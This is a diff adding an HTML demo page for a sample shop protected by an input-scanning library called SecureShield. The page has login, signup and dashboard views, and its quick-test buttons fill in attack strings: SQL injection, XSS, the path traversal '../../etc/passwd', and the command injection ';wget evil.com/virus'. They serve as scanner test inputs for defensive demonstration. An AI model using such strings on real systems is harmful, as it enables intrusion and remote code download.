@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>ShopZone — Protected by SecureShield</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #f5f0e8; --dark: #0f0e0c; --accent: #e63c2f;
+  --green: #1a7a4a; --card: #fff; --border: #e0d9ce;
+  --dbg: #0d1117; --dsurf: #161b22; --dborder: #21262d;
+  --dtext: #e6edf3; --dmuted: #8b949e; --dgreen: #56d364;
+  --head: 'Syne',sans-serif; --body: 'DM Sans',sans-serif; --mono: 'DM Mono',monospace;
+}
+body { font-family: var(--body); background: var(--bg); color: var(--dark); min-height: 100vh; }
+
+/* ── PAGES ── */
+.page { display: none; }
+.page.active { display: block; }
+
+/* ── SHARED COMPONENTS ── */
+.btn {
+  padding: 10px 22px; border-radius: 7px; font-size: .88rem; font-weight: 600;
+  cursor: pointer; border: 2px solid var(--dark); font-family: var(--body);
+  text-decoration: none; display: inline-flex; align-items: center;
+  justify-content: center; transition: all .15s; gap: 6px;
+}
+.btn-outline { background: transparent; color: var(--dark); }
+.btn-outline:hover { background: var(--dark); color: #fff; }
+.btn-solid { background: var(--dark); color: #fff; }
+.btn-solid:hover { background: #333; }
+.btn-accent { background: var(--accent); color: #fff; border-color: var(--accent); }
+.btn-accent:hover { background: #c03125; }
+.btn-green { background: var(--green); color: #fff; border-color: var(--green); width: 100%; padding: 13px; font-size: .95rem; }
+.btn-green:hover { background: #145e38; }
+.btn-ghost { background: transparent; border-color: #444; color: var(--dtext); }
+.btn-ghost:hover { background: #1c2128; }
+
+/* ── TOPBAR ── */
+.topbar {
+  background: var(--dark); color: #fff; text-align: center;
+  padding: 7px 20px; font-family: var(--mono); font-size: .72rem;
+  letter-spacing: .05em; display: flex; align-items: center; justify-content: center; gap: 8px;
+}
+.pulse { width: 7px; height: 7px; background: #4ade80; border-radius: 50%; animation: blink 2s infinite; flex-shrink: 0; }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+/* ── NAV ── */
+.nav {
+  background: var(--card); border-bottom: 2px solid var(--dark);
+  padding: 0 40px; display: flex; align-items: center;
+  justify-content: space-between; height: 64px;
+  position: sticky; top: 0; z-index: 200;
+}
+.logo { font-family: var(--head); font-size: 1.45rem; font-weight: 800; letter-spacing: -.03em; cursor: pointer; }
+.logo span { color: var(--accent); }
+.nav-links { display: flex; gap: 24px; list-style: none; }
+.nav-links a { text-decoration: none; color: var(--dark); font-size: .88rem; font-weight: 500; opacity: .6; cursor: pointer; transition: opacity .2s; }
+.nav-links a:hover { opacity: 1; }
+.nav-btns { display: flex; gap: 8px; }
+
+/* ══════════════════════════
+   HOME PAGE
+══════════════════════════ */
+#page-home {}
+
+.hero {
+  max-width: 1100px; margin: 0 auto; padding: 64px 40px 54px;
+  display: grid; grid-template-columns: 1fr 1fr; gap: 56px; align-items: center;
+}
+.hero-tag {
+  display: inline-block; background: var(--dark); color: #fff;
+  padding: 5px 14px; border-radius: 4px; font-family: var(--mono);
+  font-size: .7rem; letter-spacing: .08em; margin-bottom: 18px;
+}
+.hero h1 { font-family: var(--head); font-size: 3.2rem; font-weight: 800; line-height: 1.06; letter-spacing: -.03em; margin-bottom: 16px; }
+.hero h1 em { font-style: normal; color: var(--accent); }
+.hero p { color: #555; font-size: .98rem; line-height: 1.7; margin-bottom: 28px; }
+.hero-btns { display: flex; gap: 12px; flex-wrap: wrap; }
+
+.code-box {
+  background: var(--dark); border-radius: 14px; padding: 26px;
+  font-family: var(--mono); font-size: .8rem; line-height: 1.9; color: #aaa;
+}
+.code-box::before { content: '● ● ●'; display: block; color: #333; margin-bottom: 14px; font-size: .65rem; letter-spacing: 5px; }
+.cp{color:#ff79c6} .cg{color:#50fa7b} .cy{color:#f1fa8c} .cb{color:#8be9fd} .co{color:#ffb86c} .cm{color:#6272a4}
+
+.divider { height: 2px; background: var(--border); margin: 0 40px; }
+
+.products-section { max-width: 1100px; margin: 0 auto; padding: 50px 40px; }
+.sec-label { font-family: var(--mono); font-size: .7rem; color: var(--accent); letter-spacing: .1em; text-transform: uppercase; margin-bottom: 6px; }
+.sec-title { font-family: var(--head); font-size: 1.9rem; font-weight: 800; margin-bottom: 8px; }
+.sec-sub { color: #777; font-size: .9rem; margin-bottom: 28px; }
+.grid3 { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; }
+.prod-card { background: var(--card); border: 2px solid var(--border); border-radius: 12px; overflow: hidden; transition: transform .2s, box-shadow .2s; }
+.prod-card:hover { transform: translateY(-3px); box-shadow: 0 8px 28px rgba(0,0,0,.1); }
+.prod-img { height: 160px; display: flex; align-items: center; justify-content: center; font-size: 3.6rem; border-bottom: 2px solid var(--border); }
+.b1{background:#fef3c7} .b2{background:#dbeafe} .b3{background:#fce7f3}
+.b4{background:#d1fae5} .b5{background:#ede9fe} .b6{background:#fee2e2}
+.prod-body { padding: 16px; }
+.prod-name { font-family: var(--head); font-weight: 700; margin-bottom: 4px; font-size: .95rem; }
+.prod-price { color: var(--accent); font-weight: 700; font-size: 1.05rem; margin-bottom: 12px; }
+
+.cta-band { background: var(--dark); color: #fff; padding: 56px 40px; text-align: center; }
+.cta-band h2 { font-family: var(--head); font-size: 2.1rem; font-weight: 800; margin-bottom: 10px; }
+.cta-band p { color: #aaa; margin-bottom: 26px; }
+.cta-btns { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+
+.footer { background: var(--dark); color: #555; text-align: center; padding: 22px; font-size: .78rem; border-top: 1px solid #1a1a1a; }
+.footer a { color: #777; } .footer strong { color: #fff; }
+
+/* ══════════════════════════
+   AUTH PAGES (LOGIN / SIGNUP)
+══════════════════════════ */
+#page-login, #page-signup {
+  min-height: 100vh; display: none; flex-direction: column;
+}
+#page-login.active, #page-signup.active { display: flex; }
+
+.auth-nav { background: var(--card); border-bottom: 2px solid var(--dark); padding: 0 40px; display: flex; align-items: center; justify-content: space-between; height: 64px; }
+
+.auth-body { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; background: var(--bg); }
+
+.auth-card {
+  background: var(--card); border: 2px solid var(--dark);
+  border-radius: 16px; padding: 38px; width: 100%; max-width: 440px;
+  box-shadow: 6px 6px 0 var(--dark);
+}
+.auth-card.wide { max-width: 480px; }
+
+.card-head { text-align: center; margin-bottom: 28px; }
+.card-icon { font-size: 2.6rem; margin-bottom: 10px; }
+.card-head h2 { font-family: var(--head); font-size: 1.75rem; font-weight: 800; margin-bottom: 6px; }
+.card-head p { color: #777; font-size: .88rem; }
+
+.demo-bar { background: #f0ebe0; border: 1px solid var(--border); border-radius: 10px; padding: 12px 14px; margin-bottom: 20px; }
+.demo-bar p { font-size: .72rem; font-weight: 700; color: #777; letter-spacing: .05em; margin-bottom: 8px; text-transform: uppercase; font-family: var(--mono); }
+.demo-btns { display: flex; gap: 6px; flex-wrap: wrap; }
+.demo-btn { padding: 5px 12px; background: var(--card); border: 1px solid var(--border); border-radius: 20px; font-size: .75rem; cursor: pointer; color: #555; font-family: var(--body); transition: all .15s; }
+.demo-btn:hover { background: var(--dark); color: #fff; border-color: var(--dark); }
+.demo-btn.atk { color: var(--accent); border-color: #fca5a5; background: #fdf0ef; }
+.demo-btn.atk:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+
+.fg { margin-bottom: 16px; }
+.fg label { display: block; font-size: .8rem; font-weight: 600; margin-bottom: 6px; color: #444; }
+.fg input {
+  width: 100%; padding: 11px 14px; border: 2px solid var(--border);
+  border-radius: 8px; font-size: .9rem; font-family: var(--body);
+  background: var(--bg); color: var(--dark); outline: none; transition: border-color .2s;
+}
+.fg input:focus { border-color: var(--dark); }
+.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+
+.alert { padding: 12px 15px; border-radius: 8px; font-size: .83rem; margin-bottom: 14px; display: none; line-height: 1.55; }
+.alert-err { background: #fdf0ef; border: 2px solid #fca5a5; color: #b91c1c; display: none; }
+.alert-block { background: #120604; border: 2px solid var(--accent); color: #ff7b72; font-family: var(--mono); font-size: .78rem; display: none; }
+
+.strength-bar { height: 4px; background: var(--border); border-radius: 2px; margin-top: 6px; overflow: hidden; }
+.strength-fill { height: 100%; border-radius: 2px; width: 0; transition: width .3s, background .3s; }
+
+.shield-note { display: flex; align-items: center; gap: 7px; justify-content: center; font-family: var(--mono); font-size: .7rem; color: #aaa; margin-top: 18px; }
+.sdot { width: 6px; height: 6px; background: #4ade80; border-radius: 50%; animation: blink 2s infinite; }
+
+.divline { text-align: center; color: #ccc; font-size: .8rem; margin: 18px 0; position: relative; }
+.divline::before,.divline::after { content:''; position: absolute; top: 50%; width: 42%; height: 1px; background: var(--border); }
+.divline::before{left:0} .divline::after{right:0}
+
+.link-row { text-align: center; margin-top: 14px; font-size: .86rem; color: #777; }
+.link-row a { color: var(--dark); font-weight: 600; text-decoration: none; cursor: pointer; }
+.link-row a:hover { text-decoration: underline; }
+
+/* ══════════════════════════
+   DASHBOARD PAGE
+══════════════════════════ */
+#page-dashboard { display: none; background: var(--dbg); color: var(--dtext); min-height: 100vh; }
+#page-dashboard.active { display: flex; }
+
+.sidebar {
+  width: 230px; flex-shrink: 0; background: var(--dsurf);
+  border-right: 1px solid var(--dborder); height: 100vh;
+  position: sticky; top: 0; display: flex; flex-direction: column;
+}
+.sb-logo { padding: 22px 18px 18px; border-bottom: 1px solid var(--dborder); }
+.sb-logo-text { font-family: var(--head); font-size: 1.3rem; font-weight: 800; }
+.sb-logo-text span { color: var(--accent); }
+.sb-logo small { display: block; font-size: .63rem; font-family: var(--mono); color: var(--dmuted); margin-top: 3px; }
+.sb-nav { padding: 14px 10px; flex: 1; overflow-y: auto; }
+.sb-sec { font-family: var(--mono); font-size: .63rem; color: var(--dmuted); letter-spacing: .1em; padding: 8px 8px 5px; text-transform: uppercase; }
+.sb-item { display: flex; align-items: center; gap: 9px; padding: 9px 10px; border-radius: 7px; cursor: pointer; margin-bottom: 1px; font-size: .86rem; color: var(--dmuted); transition: all .15s; }
+.sb-item:hover { background: #1c2128; color: var(--dtext); }
+.sb-item.active { background: #1c2128; color: var(--dtext); font-weight: 600; }
+.sb-foot { padding: 14px; border-top: 1px solid var(--dborder); display: flex; align-items: center; gap: 10px; }
+.sb-av { width: 34px; height: 34px; border-radius: 50%; background: linear-gradient(135deg,#238636,#58a6ff); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: .85rem; flex-shrink: 0; }
+.sb-uname { font-size: .83rem; font-weight: 600; }
+.sb-uemail { font-size: .7rem; color: var(--dmuted); }
+.sb-logout { margin-left: auto; background: none; border: none; cursor: pointer; color: var(--dmuted); font-size: 1rem; padding: 4px; }
+.sb-logout:hover { color: var(--accent); }
+
+.db-main { flex: 1; overflow-y: auto; }
+.db-topbar { background: var(--dsurf); border-bottom: 1px solid var(--dborder); padding: 15px 26px; display: flex; align-items: center; justify-content: space-between; }
+.db-topbar h1 { font-family: var(--head); font-size: 1.2rem; font-weight: 800; }
+.status-pill { display: flex; align-items: center; gap: 7px; background: #0d2818; border: 1px solid #238636; padding: 5px 13px; border-radius: 20px; font-family: var(--mono); font-size: .7rem; color: var(--dgreen); }
+
+.db-content { padding: 24px; }
+
+.welcome-banner {
+  background: linear-gradient(135deg,#1a2744,#0d1117);
+  border: 1px solid #1e3a5f; border-radius: 14px;
+  padding: 26px 30px; margin-bottom: 22px;
+  display: flex; align-items: center; justify-content: space-between; gap: 20px;
+}
+.wb-left h2 { font-family: var(--head); font-size: 1.55rem; font-weight: 800; margin-bottom: 6px; }
+.wb-left p { color: var(--dmuted); font-size: .88rem; }
+.wb-left .wb-btns { margin-top: 14px; display: flex; gap: 10px; }
+.wb-badge { background: #0d2818; border: 1px solid #238636; color: var(--dgreen); padding: 14px 22px; border-radius: 12px; font-family: var(--mono); font-size: .75rem; text-align: center; flex-shrink: 0; }
+.wb-badge .big { font-size: 2rem; font-weight: 800; display: block; font-family: var(--head); }
+
+.stats-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 14px; margin-bottom: 22px; }
+.stat-c { background: var(--dsurf); border: 1px solid var(--dborder); border-radius: 12px; padding: 18px; }
+.stat-lbl { font-size: .72rem; color: var(--dmuted); font-weight: 600; letter-spacing: .04em; margin-bottom: 7px; display: flex; justify-content: space-between; }
+.stat-val { font-family: var(--head); font-size: 1.8rem; font-weight: 800; margin-bottom: 3px; }
+.stat-sub { font-size: .72rem; color: var(--dmuted); }
+.cgreen{color:var(--dgreen)} .cred{color:#ff6b5b} .cblue{color:#58a6ff} .cyellow{color:#e3b341}
+
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; margin-bottom: 22px; }
+.panel { background: var(--dsurf); border: 1px solid var(--dborder); border-radius: 12px; overflow: hidden; }
+.panel-hd { padding: 14px 18px; border-bottom: 1px solid var(--dborder); display: flex; align-items: center; justify-content: space-between; }
+.panel-hd h3 { font-family: var(--head); font-size: .92rem; font-weight: 700; }
+.panel-bd { padding: 18px; }
+
+.atk-item { display: flex; align-items: flex-start; gap: 10px; padding: 11px 0; border-bottom: 1px solid var(--dborder); }
+.atk-item:last-child { border-bottom: none; padding-bottom: 0; }
+.atk-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); flex-shrink: 0; margin-top: 4px; }
+.atk-type { font-weight: 600; font-size: .83rem; margin-bottom: 2px; }
+.atk-meta { font-size: .72rem; color: var(--dmuted); font-family: var(--mono); }
+.atk-badge { margin-left: auto; padding: 3px 9px; border-radius: 20px; font-size: .68rem; font-weight: 700; font-family: var(--mono); flex-shrink: 0; background: #2d1012; border: 1px solid var(--accent); color: #ff6b5b; }
+.empty-st { text-align: center; padding: 28px 16px; color: var(--dmuted); }
+.empty-st .eicon { font-size: 2.2rem; margin-bottom: 10px; }
+.empty-st p { font-size: .82rem; line-height: 1.55; }
+
+.bk-item { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+.bk-item:last-child { margin-bottom: 0; }
+.bk-icon { font-size: 1.1rem; width: 24px; text-align: center; }
+.bk-info { flex: 1; }
+.bk-name { font-size: .82rem; font-weight: 600; margin-bottom: 4px; }
+.bk-bar-wrap { background: #1c2128; border-radius: 4px; height: 5px; overflow: hidden; }
+.bk-bar { height: 100%; border-radius: 4px; background: var(--accent); }
+.bk-cnt { font-family: var(--mono); font-size: .72rem; color: var(--dmuted); flex-shrink: 0; }
+
+.profile-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+.pf-item .pf-lbl { font-size: .7rem; color: var(--dmuted); font-weight: 600; letter-spacing: .04em; margin-bottom: 4px; }
+.pf-item .pf-val { font-size: .88rem; font-weight: 500; }
+
+.scanner-panel { margin-bottom: 22px; }
+.scan-qs { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
+.sq-btn { padding: 5px 12px; border-radius: 20px; font-size: .73rem; cursor: pointer; border: 1px solid var(--dborder); background: #1c2128; color: var(--dmuted); font-family: var(--body); transition: all .15s; }
+.sq-btn:hover { border-color: var(--accent); color: #ff6b5b; }
+.sq-btn.s:hover { border-color: var(--dgreen); color: var(--dgreen); }
+.scan-row { display: flex; gap: 10px; }
+.scan-input { flex: 1; background: #1c2128; border: 1px solid var(--dborder); border-radius: 8px; padding: 10px 14px; color: var(--dtext); font-family: var(--mono); font-size: .83rem; outline: none; }
+.scan-input:focus { border-color: #58a6ff; }
+.scan-btn { padding: 10px 20px; background: #238636; color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-family: var(--body); font-size: .85rem; }
+.scan-btn:hover { background: #1a6b2a; }
+.scan-result { padding: 13px 16px; border-radius: 8px; font-family: var(--mono); font-size: .78rem; line-height: 1.7; margin-top: 10px; display: none; white-space: pre-wrap; }
+.scan-result.blocked { background: #120604; border: 1px solid var(--accent); color: #ff7b72; }
+.scan-result.safe { background: #0b1f12; border: 1px solid #238636; color: var(--dgreen); }
+
+.clr-btn { padding: 4px 12px; background: transparent; border: 1px solid var(--dborder); border-radius: 6px; color: var(--dmuted); font-size: .73rem; cursor: pointer; font-family: var(--body); }
+.clr-btn:hover { border-color: var(--accent); color: #ff6b5b; }
+
+@media(max-width:900px) {
+  .sidebar{display:none} .stats-grid{grid-template-columns:1fr 1fr} .two-col{grid-template-columns:1fr}
+}
+@media(max-width:640px) {
+  .hero{grid-template-columns:1fr;padding:36px 20px} .grid3{grid-template-columns:1fr}
+  .nav,.auth-nav{padding:0 20px} .nav-links{display:none}
+  .stats-grid{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════════
+     PAGE: HOME
+══════════════════════════════════════════ -->
+<div id="page-home" class="page active">
+  <div class="topbar"><div class="pulse"></div>🛡️ SecureShield Active — All inputs scanned in real-time</div>
+  <nav class="nav">
+    <div class="logo" onclick="goTo('home')">Shop<span>Zone</span></div>
+    <ul class="nav-links">
+      <li><a onclick="goTo('home')">Home</a></li>
+      <li><a onclick="document.getElementById('products-section').scrollIntoView({behavior:'smooth'})">Products</a></li>
+    </ul>
+    <div class="nav-btns" id="home-nav-btns">
+      <button class="btn btn-outline" onclick="goTo('login')">Log In</button>
+      <button class="btn btn-solid" onclick="goTo('signup')">Sign Up</button>
+    </div>
+  </nav>
+
+  <div class="hero">
+    <div>
+      <div class="hero-tag">PROTECTED BY SECURESHIELD v1.0</div>
+      <h1>Shop Safe.<br/>Shop <em>Smart.</em></h1>
+      <p>ShopZone is a sample e-commerce site demonstrating how <strong>SecureShield</strong> blocks SQL Injection, XSS, and other web attacks in real-time — before they can cause harm.</p>
+      <div class="hero-btns">
+        <button class="btn btn-solid" onclick="goTo('signup')">Create Account →</button>
+        <button class="btn btn-outline" onclick="goTo('login')">Log In</button>
+      </div>
+    </div>
+    <div class="code-box">
+<span class="cm"># 4 lines protect your entire website</span>
+
+<span class="cp">from</span> <span class="cb">secureshield</span> <span class="cp">import</span> scan_url
+<span class="cp">from</span> <span class="cb">flask</span> <span class="cp">import</span> Flask, request
+
+app = Flask(__name__)
+
+<span class="cy">@app.before_request</span>
+<span class="cp">def</span> <span class="cg">protect()</span>:
+    attack = scan_url(request.url)
+    <span class="cp">if</span> attack:
+        <span class="cp">return</span> <span class="co">f"Blocked: {attack}"</span>, <span class="cb">403</span>
+
+<span class="cm"># Every route is now protected ✅</span>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <div class="products-section" id="products-section">
+    <div class="sec-label">// FEATURED PRODUCTS</div>
+    <div class="sec-title">Our Collection</div>
+    <div class="sec-sub">Create a free account to add items to your cart and access your dashboard.</div>
+    <div class="grid3">
+      <div class="prod-card"><div class="prod-img b1">👟</div><div class="prod-body"><div class="prod-name">Air Runner Pro</div><div class="prod-price">$129.99</div><button class="btn btn-solid" onclick="goTo('signup')" style="width:100%">Add to Cart</button></div></div>
+      <div class="prod-card"><div class="prod-img b2">🎧</div><div class="prod-body"><div class="prod-name">SoundMax Headphones</div><div class="prod-price">$89.99</div><button class="btn btn-solid" onclick="goTo('signup')" style="width:100%">Add to Cart</button></div></div>
+      <div class="prod-card"><div class="prod-img b3">⌚</div><div class="prod-body"><div class="prod-name">SmartWatch Elite</div><div class="prod-price">$249.99</div><button class="btn btn-solid" onclick="goTo('signup')" style="width:100%">Add to Cart</button></div></div>
+      <div class="prod-card"><div class="prod-img b4">💻</div><div class="prod-body"><div class="prod-name">UltraBook 14</div><div class="prod-price">$999.99</div><button class="btn btn-solid" onclick="goTo('signup')" style="width:100%">Add to Cart</button></div></div>
+      <div class="prod-card"><div class="prod-img b5">📷</div><div class="prod-body"><div class="prod-name">ProShot Camera</div><div class="prod-price">$449.99</div><button class="btn btn-solid" onclick="goTo('signup')" style="width:100%">Add to Cart</button></div></div>
+      <div class="prod-card"><div class="prod-img b6">🎮</div><div class="prod-body"><div class="prod-name">GamePad X</div><div class="prod-price">$69.99</div><button class="btn btn-solid" onclick="goTo('signup')" style="width:100%">Add to Cart</button></div></div>
+    </div>
+  </div>
+
+  <div class="cta-band">
+    <h2>Ready to get started?</h2>
+    <p>Create your free account and see SecureShield protection live in your dashboard.</p>
+    <div class="cta-btns">
+      <button class="btn btn-accent" onclick="goTo('signup')">Create Free Account →</button>
+      <button class="btn btn-outline" style="color:#fff;border-color:#fff" onclick="goTo('login')">Log In</button>
+    </div>
+  </div>
+
+  <div class="footer">
+    🛡️ <strong>ShopZone</strong> protected by <strong>SecureShield v1.0.0</strong> ·
+    <a href="https://github.com/Sudharsan56/secureshield" target="_blank">GitHub</a> · MIT License
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     PAGE: LOGIN
+══════════════════════════════════════════ -->
+<div id="page-login" class="page">
+  <div class="topbar"><div class="pulse"></div>🛡️ SecureShield scanning all login inputs</div>
+  <nav class="auth-nav">
+    <div class="logo" onclick="goTo('home')">Shop<span>Zone</span></div>
+    <button class="btn btn-outline" onclick="goTo('signup')">Create Account</button>
+  </nav>
+  <div class="auth-body">
+    <div class="auth-card">
+      <div class="card-head">
+        <div class="card-icon">🔐</div>
+        <h2>Welcome Back</h2>
+        <p>Log in to your ShopZone account</p>
+      </div>
+
+      <div class="demo-bar">
+        <p>⚡ Demo — click to auto-fill and login:</p>
+        <div class="demo-btns">
+          <button class="demo-btn" onclick="loginFill('john@demo.com','pass123')">✅ John (john@demo.com)</button>
+          <button class="demo-btn" onclick="loginFill('alice@demo.com','hello123')">✅ Alice</button>
+          <button class="demo-btn atk" onclick="loginFill(&quot;admin'--&quot;,'x')">💉 SQL Attack</button>
+          <button class="demo-btn atk" onclick="loginFill('hack&lt;script&gt;','x')">⚡ XSS Attack</button>
+        </div>
+      </div>
+
+      <div class="alert alert-block" id="login-blocked">
+        🚨 <strong>SecureShield Blocked!</strong><br/>
+        Attack: <span id="login-blocked-type"></span><br/>
+        <small style="opacity:.7">Logged to security dashboard.</small>
+      </div>
+      <div class="alert alert-err" id="login-err"></div>
+
+      <div class="fg"><label>Email</label><input type="text" id="l-email" placeholder="you@example.com"/></div>
+      <div class="fg"><label>Password</label><input type="password" id="l-pass" placeholder="Your password"/></div>
+
+      <button class="btn btn-green" onclick="doLogin()">Log In to ShopZone →</button>
+
+      <div class="shield-note"><div class="sdot"></div>SecureShield scanning all inputs</div>
+      <div class="divline">or</div>
+      <div class="link-row">No account? <a onclick="goTo('signup')">Sign up free →</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     PAGE: SIGNUP
+══════════════════════════════════════════ -->
+<div id="page-signup" class="page">
+  <div class="topbar"><div class="pulse"></div>🛡️ SecureShield scanning all signup inputs</div>
+  <nav class="auth-nav">
+    <div class="logo" onclick="goTo('home')">Shop<span>Zone</span></div>
+    <button class="btn btn-outline" onclick="goTo('login')">Log In</button>
+  </nav>
+  <div class="auth-body">
+    <div class="auth-card wide">
+      <div class="card-head">
+        <div class="card-icon">🛍️</div>
+        <h2>Create Account</h2>
+        <p>Join ShopZone — free forever · 🛡️ SecureShield protected</p>
+      </div>
+
+      <div class="alert alert-block" id="signup-blocked">
+        🚨 <strong>SecureShield Blocked!</strong><br/>
+        Attack: <span id="signup-blocked-type"></span><br/>
+        <small style="opacity:.7">Logged automatically.</small>
+      </div>
+      <div class="alert alert-err" id="signup-err"></div>
+
+      <div class="form-row">
+        <div class="fg"><label>First Name</label><input type="text" id="s-fname" placeholder="John"/></div>
+        <div class="fg"><label>Last Name</label><input type="text" id="s-lname" placeholder="Doe"/></div>
+      </div>
+      <div class="fg"><label>Email</label><input type="text" id="s-email" placeholder="you@example.com"/></div>
+      <div class="fg">
+        <label>Password</label>
+        <input type="password" id="s-pass" placeholder="Min. 6 characters" oninput="pwStrength(this.value)"/>
+        <div class="strength-bar"><div class="strength-fill" id="pw-fill"></div></div>
+      </div>
+      <div class="fg"><label>Confirm Password</label><input type="password" id="s-confirm" placeholder="Repeat password"/></div>
+
+      <button class="btn btn-green" onclick="doSignup()">Create My Account →</button>
+
+      <div class="shield-note"><div class="sdot"></div>All fields protected by SecureShield</div>
+      <div class="divline">or</div>
+      <div class="link-row">Have an account? <a onclick="goTo('login')">Log in →</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     PAGE: DASHBOARD
+══════════════════════════════════════════ -->
+<div id="page-dashboard" class="page">
+  <div class="sidebar">
+    <div class="sb-logo">
+      <div class="sb-logo-text">Shop<span>Zone</span></div>
+      <small>🛡️ SECURESHIELD ACTIVE</small>
+    </div>
+    <div class="sb-nav">
+      <div class="sb-sec">Main</div>
+      <div class="sb-item active">🏠 &nbsp;Dashboard</div>
+      <div class="sb-item" onclick="goTo('home')">🛍️ &nbsp;Shop</div>
+      <div class="sb-sec" style="margin-top:10px">Security</div>
+      <div class="sb-item" onclick="document.getElementById('db-scanner').scrollIntoView({behavior:'smooth'})">🔍 &nbsp;Live Scanner</div>
+      <div class="sb-item" onclick="document.getElementById('db-log').scrollIntoView({behavior:'smooth'})">🚨 &nbsp;Attack Log</div>
+      <div class="sb-sec" style="margin-top:10px">Account</div>
+      <div class="sb-item" onclick="document.getElementById('db-profile').scrollIntoView({behavior:'smooth'})">👤 &nbsp;Profile</div>
+    </div>
+    <div class="sb-foot">
+      <div class="sb-av" id="db-av">?</div>
+      <div><div class="sb-uname" id="db-uname">User</div><div class="sb-uemail" id="db-uemail"></div></div>
+      <button class="sb-logout" onclick="doLogout()" title="Log out">⏏</button>
+    </div>
+  </div>
+
+  <div class="db-main">
+    <div class="db-topbar">
+      <h1>My Dashboard</h1>
+      <div class="status-pill"><div class="pulse"></div>SecureShield Active</div>
+    </div>
+
+    <div class="db-content">
+
+      <!-- Welcome -->
+      <div class="welcome-banner">
+        <div class="wb-left">
+          <h2>Welcome back, <span id="db-welcome-name">User</span>! 👋</h2>
+          <p>Your account is protected. All attack attempts are logged below.</p>
+          <div class="wb-btns">
+            <button class="btn btn-ghost" onclick="goTo('home')">← Back to Shop</button>
+            <button class="btn btn-ghost" onclick="doLogout()">Log Out ⏏</button>
+          </div>
+        </div>
+        <div class="wb-badge">
+          <span class="big" id="db-total">0</span>
+          Attacks Blocked
+        </div>
+      </div>
+
+      <!-- Stats -->
+      <div class="stats-grid">
+        <div class="stat-c"><div class="stat-lbl">TOTAL BLOCKED <span>🛡️</span></div><div class="stat-val cgreen" id="st-total">0</div><div class="stat-sub">all attacks</div></div>
+        <div class="stat-c"><div class="stat-lbl">SQL INJECTIONS <span>💉</span></div><div class="stat-val cred" id="st-sql">0</div><div class="stat-sub">database attacks</div></div>
+        <div class="stat-c"><div class="stat-lbl">XSS ATTACKS <span>⚡</span></div><div class="stat-val cyellow" id="st-xss">0</div><div class="stat-sub">script injections</div></div>
+        <div class="stat-c"><div class="stat-lbl">OTHER <span>📂</span></div><div class="stat-val cblue" id="st-other">0</div><div class="stat-sub">path/cmd/other</div></div>
+      </div>
+
+      <!-- Two col -->
+      <div class="two-col" id="db-log">
+        <div class="panel">
+          <div class="panel-hd">
+            <h3>🚨 Attack Log</h3>
+            <button class="clr-btn" onclick="clearLog()">Clear</button>
+          </div>
+          <div class="panel-bd" id="db-log-body">
+            <div class="empty-st"><div class="eicon">✅</div><p>No attacks yet.<br/>Try the scanner below!</p></div>
+          </div>
+        </div>
+
+        <div style="display:flex;flex-direction:column;gap:18px">
+          <div class="panel">
+            <div class="panel-hd"><h3>📊 Breakdown</h3></div>
+            <div class="panel-bd" id="db-breakdown">
+              <div style="color:var(--dmuted);font-size:.82rem;text-align:center;padding:16px 0">No data yet</div>
+            </div>
+          </div>
+          <div class="panel" id="db-profile">
+            <div class="panel-hd"><h3>👤 My Profile</h3></div>
+            <div class="panel-bd">
+              <div class="profile-grid">
+                <div class="pf-item"><div class="pf-lbl">FULL NAME</div><div class="pf-val" id="p-name">—</div></div>
+                <div class="pf-item"><div class="pf-lbl">EMAIL</div><div class="pf-val" id="p-email" style="word-break:break-all">—</div></div>
+                <div class="pf-item"><div class="pf-lbl">MEMBER SINCE</div><div class="pf-val" id="p-joined">—</div></div>
+                <div class="pf-item"><div class="pf-lbl">SECURITY</div><div class="pf-val cgreen">🛡️ Protected</div></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Scanner -->
+      <div class="panel scanner-panel" id="db-scanner">
+        <div class="panel-hd"><h3>🔍 SecureShield Live Scanner</h3></div>
+        <div class="panel-bd">
+          <p style="color:var(--dmuted);font-size:.85rem;margin-bottom:14px">Type any URL or text — SecureShield will scan it instantly.</p>
+          <div class="scan-qs">
+            <span style="font-size:.7rem;color:var(--dmuted);align-self:center">Quick test:</span>
+            <button class="sq-btn s" onclick="scanQuick('john@example.com')">✅ Safe email</button>
+            <button class="sq-btn" onclick="scanQuick(&quot;admin'--&quot;)">💉 SQL Inject</button>
+            <button class="sq-btn" onclick="scanQuick('1 OR 1=1')">💉 SQL Bypass</button>
+            <button class="sq-btn" onclick="scanQuick('onerror=alert(1)')">⚡ XSS</button>
+            <button class="sq-btn" onclick="scanQuick('../../etc/passwd')">📂 Path Traversal</button>
+            <button class="sq-btn" onclick="scanQuick(';wget evil.com/virus')">💻 Cmd Inject</button>
+          </div>
+          <div class="scan-row">
+            <input class="scan-input" id="scan-in" placeholder="Type anything to scan..." />
+            <button class="scan-btn" onclick="doScan()">Scan →</button>
+          </div>
+          <div class="scan-result" id="scan-out"></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
